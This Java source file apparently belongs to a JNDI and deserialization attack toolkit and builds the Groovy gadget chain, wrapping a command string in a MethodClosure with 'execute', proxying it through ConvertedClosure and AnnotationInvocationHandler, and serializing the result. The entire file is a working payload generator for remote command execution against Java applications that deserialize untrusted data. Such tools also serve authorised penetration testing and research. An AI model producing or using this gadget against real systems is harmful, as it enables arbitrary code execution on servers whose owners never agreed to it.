package sonomon.jndi.deser.gadgets;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import org.codehaus.groovy.runtime.ConvertedClosure;

import groovy.lang.Closure;
import sonomon.jndi.deser.MyURLClassLoader;
import sonomon.jndi.factory.FactoryUtils;

public class Groovy implements SerializeObject{
	
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
        MyURLClassLoader classLoader = new MyURLClassLoader(jarname);
        Class clazz = classLoader.loadClass("org.codehaus.groovy.runtime.MethodClosure");
        Closure methodClosure = (Closure) clazz.getDeclaredConstructor(Object.class,String.class).newInstance(payload, "execute");
        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "entrySet");
        Map proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, convertedClosure);
        Class clazz_AIH = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons_AIH = clazz_AIH.getDeclaredConstructor(Class.class, Map.class);
        cons_AIH.setAccessible(true);
        InvocationHandler ih = (InvocationHandler)cons_AIH.newInstance(Override.class, proxy);
        return ih;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}